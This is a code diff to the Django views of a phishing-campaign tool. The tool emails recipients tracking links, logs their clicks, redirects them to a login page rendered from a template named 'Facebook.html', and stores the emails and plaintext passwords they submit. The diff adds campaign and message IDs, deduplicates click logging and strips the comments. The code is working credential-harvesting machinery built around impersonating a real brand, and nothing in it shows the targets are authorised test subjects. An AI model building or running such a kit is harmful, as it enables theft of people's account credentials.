@@ -4,18 +4,18 @@ from .serializers import SenderSerializer, RecipientGroupSerializer, RecipientSe
 from rest_framework.response import Response
 from rest_framework.decorators import action
 from django.core.mail import get_connection, EmailMessage
-import logging
+import logging, json
 from django.shortcuts import render, redirect
 from django.http import JsonResponse
 from django.utils.timezone import now
 from django.views.decorators.csrf import csrf_exempt
-import json
+from django.conf import settings
 
 logger = logging.getLogger(__name__)
 
-def login_template_view(request, recipient_id):
-    """Рендерит страницу логина с динамическим recipient_id."""
-    return render(request, "email_templates/login.html", {"recipient_id": recipient_id})
+def login_template_view(request, recipient_id, message_id):
+    return render(request, "email_templates/Facebook.html", {"recipient_id": recipient_id, "message_id": message_id})
+
 
 class ClickLogViewSet(viewsets.ReadOnlyModelViewSet):
     queryset = ClickLog.objects.select_related('recipient').order_by('-timestamp')
@@ -24,7 +24,6 @@ class ClickLogViewSet(viewsets.ReadOnlyModelViewSet):
 class CredentialLogViewSet(viewsets.ReadOnlyModelViewSet):
     queryset = CredentialLog.objects.select_related('recipient').order_by('-timestamp')
     serializer_class = CredentialLogSerializer
-
 
 class SenderViewSet(viewsets.ModelViewSet):
     queryset = Sender.objects.all()
@@ -104,6 +103,7 @@ class MessageViewSet(viewsets.ModelViewSet):
     def send_message(self, request):
         sender_id = request.data.get("sender")
         group_id = request.data.get("recipient_group")
+        campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
         subject = request.data.get("subject")
         body = request.data.get("body")
         use_template = request.data.get("use_template", False)
@@ -132,9 +132,20 @@ class MessageViewSet(viewsets.ModelViewSet):
                 use_ssl=sender.smtp_port == 465
             )
 
+            message = Message.objects.create(
+                sender=sender,
+                recipient_group=group,
+                campaign_name=campaign_name,
+                subject=subject,
+                body=body,
+                link=None  # Заполним позже
+            )
+
+            message.recipients.set(recipients)
+
             for recipient in recipients:
-                # Формируем индивидуальную ссылку для каждого получателя
-                tracking_link = f"http://localhost:8000/track/{recipient.id}/"
+                tracking_link = f"{settings.BASE_URL}/track/{recipient.id}/{message.id}/"  # <-- Передаем message_id
+
                 email_body = f"{body}\n\n🔗 Click here: {tracking_link}" if use_template else body
 
                 email = EmailMessage(
@@ -145,17 +156,10 @@ class MessageViewSet(viewsets.ModelViewSet):
                     connection=connection
                 )
 
-                result = email.send()
+                email.send()
 
-                if result > 0:
-                    # Создаём запись для каждого сообщения
-                    Message.objects.create(
-                        sender=sender,
-                        recipient_group=group,
-                        subject=subject,
-                        body=email_body,
-                        link=tracking_link if use_template else None
-                    )
+            message.link = f"{settings.BASE_URL}/track/{recipients[0].id}/{message.id}/"
+            message.save()
 
             return Response({"status": "Messages sent successfully"}, status=201)
 
@@ -164,29 +168,37 @@ class MessageViewSet(viewsets.ModelViewSet):
 
 
 
-def track_click(request, recipient_id):
-    """Фиксирует факт клика и перенаправляет пользователя на форму логина."""
+def track_click(request, recipient_id, message_id):
     ip = get_client_ip(request)
     user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
 
     try:
         recipient = Recipient.objects.get(id=recipient_id)
+        message = Message.objects.get(id=message_id)  # <-- Получаем кампанию
     except Recipient.DoesNotExist:
         return JsonResponse({"error": "Recipient not found"}, status=404)
+    except Message.DoesNotExist:
+        return JsonResponse({"error": "Message not found"}, status=404)
 
-    ClickLog.objects.create(
-        recipient=recipient,
-        ip_address=ip,
-        user_agent=user_agent,
-        timestamp=now()
-    )
+    # Проверяем, был ли уже зарегистрирован клик для этой кампании и пользователя
+    existing_click = ClickLog.objects.filter(recipient=recipient, message=message).exists()
 
-    return redirect(f"/email-template/{recipient_id}/")
+    if not existing_click:
+        ClickLog.objects.create(
+            recipient=recipient,
+            message=message,  # <-- Сохраняем кампанию
+            ip_address=ip,
+            user_agent=user_agent,
+            timestamp=now()
+        )
+
+    return redirect(f"/email-template/{recipient_id}/{message_id}/") 
 
 
 
-def capture_credentials(request, recipient_id):
-    """Сохраняет введённые данные (email и пароль) в базу данных."""
+
+def capture_credentials(request, recipient_id, message_id):
+    
     if request.method == "POST":
         email = request.POST.get("email")
         password = request.POST.get("password")
@@ -195,11 +207,13 @@ def capture_credentials(request, recipient_id):
 
         try:
             recipient = Recipient.objects.get(id=recipient_id)
+            message = Message.objects.get(id=message_id)
         except Recipient.DoesNotExist:
             recipient = None
 
         CredentialLog.objects.create(
             recipient=recipient,
+            message=message,
             email=email,
             password=password,
             ip_address=ip,
@@ -224,27 +238,21 @@ def get_client_ip(request):
 
 @csrf_exempt
 def send_test_email(request):
-    """Отправка тестового email без сохранения отправителя в базе данных."""
 
     if request.method == "POST":
         try:
             data = json.loads(request.body)
-
-            # Получаем SMTP-настройки и email из запроса
             email = data.get("email")
             smtp_host = data.get("smtp_host")
             smtp_port = int(data.get("smtp_port"))
             smtp_username = data.get("smtp_username")
             smtp_password = data.get("smtp_password")
 
-            # Проверяем заполненность полей
             if not (email and smtp_host and smtp_port and smtp_username and smtp_password):
                 return JsonResponse({"error": "All SMTP fields and recipient email are required"}, status=400)
 
-            # Логируем данные (без пароля!)
             logger.info(f"Sending test email to {email} using SMTP {smtp_host}:{smtp_port} as {smtp_username}")
 
-            # Настройка SMTP-соединения
             connection = get_connection(
                 backend="django.core.mail.backends.smtp.EmailBackend",
                 host=smtp_host,
@@ -255,7 +263,6 @@ def send_test_email(request):
                 use_ssl=smtp_port == 465,
             )
 
-            # Создаем тестовое письмо
             email_message = EmailMessage(
                 subject="Test Email",
                 body="This is a test email to verify SMTP settings.",
@@ -264,7 +271,6 @@ def send_test_email(request):
                 connection=connection
             )
 
-            # Отправляем тестовое письмо
             result = email_message.send()
 
             if result > 0:
